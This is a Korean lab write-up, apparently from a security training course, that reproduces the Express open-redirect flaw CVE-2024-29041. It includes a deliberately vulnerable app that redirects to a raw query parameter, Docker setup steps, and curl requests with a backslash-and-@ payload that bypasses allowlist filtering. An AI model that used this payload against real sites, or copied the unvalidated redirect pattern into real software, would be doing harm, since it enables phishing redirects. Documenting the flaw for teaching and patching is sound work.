# CVE-2024-29041 | Open Redirect

> 화이트햇 스쿨 3기 (19반) - [강다윤 (@daayuun)](https://github.com/daayuun)

---

## 📌 요약

Express 4.19.2 미만 및 5.0.0-beta.3 미만의 일k부 버전에서는 `res.location()` 혹은 내부적으로 이를 사용하는 `res.redirect()`에서 사용자 입력이 `encodeurl()`을 통해 인코딩됩니다. 이 과정에서 백슬래시(\\)와 `@` 기호 조합을 이용하면 화이트리스트 기반 필터링을 우회한 오픈 리다이렉트(Open Redirect) 취약점이 발생합니다.

- 영향을 받는 버전:
  - `< 4.19.2`
  - `>= 5.0.0-alpha.1, < 5.0.0-beta.3`

---

## 🔧 PoC 구성

해당 PoC는 CVE 내용 및 기존 공개 PoC를 참고하였으며, 이를 바탕으로 **Express 프레임워크를 선택**하여 취약점을 직접 재현했습니다.  
취약한 버전과 패치된 버전의 Express 앱을 각각 `vuln-app`, `normal-app`으로 구성하고 `q` 쿼리 파라미터를 통해 입력된 값을 `Location` 헤더로 전달하도록 구현했습니다.

```js
// index.js
const express = require("express");
const app = express();
const port = 3000;

app.use(function (req, res) {
  res.location(req.query.q).end();
});

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
```

| 앱 이름    | Express 버전 |
| ---------- | ------------ |
| vuln-app   | 4.19.0       |
| normal-app | 4.19.2       |

---

## 🐳 환경 구성 및 실행

포트 매핑:

- `vuln-app`: localhost:8002
- `normal-app`: localhost:8003

```bash
# 저장소 클론
git clone https://github.com/daayuun/kr-vulhub.git
cd kr-vulhub/CVE-2024-29041

# 이미지 빌드
make build

# 컨테이너 실행
make up

# 종료
make down

# 로그 보기
make logs

# 컨테이너 재시작
make restart

# 컨테이너 및 이미지 제거
make clean

# 이미지 제거 후 재빌드
make rebuild
```

---

## ✅ 결과 확인

```bash
# 패치된 버전 (4.19.2)
curl -i "http://localhost:8003?q=http://google.com%5C%5C@apple.com"
```

```http
HTTP/1.1 200 OK
Location: http://google.com\%5C@apple.com
```

```bash
# 취약한 버전 (4.19.0)
curl -i "http://localhost:8002?q=http://google.com%5C%5C@apple.com"
```

```http
HTTP/1.1 200 OK
Location: http://google.com\\@apple.com
```

---

## 🛠️ 정리

취약한 Express 버전에서는 쿼리 파라미터에 인코딩된 백슬래시(`%5C`)가 `encodeurl()` 처리 이후에도 이스케이프되지 않고 남아, `@` 기호 이전의 도메인이 사용자 인증 정보로 처리됩니다. 이로 인해 `apple.com`으로 리디렉션되어, 화이트리스트 우회가 가능한 오픈 리다이렉트가 발생합니다.

브라우저나 URL 파서에 따라 리디렉션 처리 방식이 달라질 수 있으며, 피싱 등 공격에 악용될 수 있으므로 적절한 패치가 필요합니다.
